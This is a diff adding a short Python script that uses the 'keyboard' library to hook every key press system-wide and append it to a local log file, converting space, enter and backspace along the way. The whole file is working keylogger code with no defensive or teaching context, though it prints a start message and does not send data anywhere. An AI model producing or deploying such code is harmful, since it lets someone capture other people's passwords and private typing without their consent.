@@ -1,0 +1,32 @@
+import keyboard  
+import time  
+  
+# Set the file to log keystrokes to  
+log_file = "keystroke_log.txt"  
+  
+def log_keystroke(event):  
+    # Get the key pressed  
+    key = event.name  
+  
+    # Convert special keys to readable format  
+    if key == "space":  
+        key = " "  
+    elif key == "enter":  
+        key = "\n"  
+    elif key == "backspace":  
+        key = "[BACKSPACE]"  
+  
+    # Log the keystroke to the file  
+    with open(log_file, "a") as f:  
+        f.write(key)  
+  
+# Set up the keyboard hook  
+keyboard.on_press(log_keystroke)  
+  
+print("Key logger started. Press Ctrl+C to stop.")  
+  
+try:  
+    while True:  
+        time.sleep(0.1)  
+except KeyboardInterrupt:  
+    print("Key logger stopped.")  
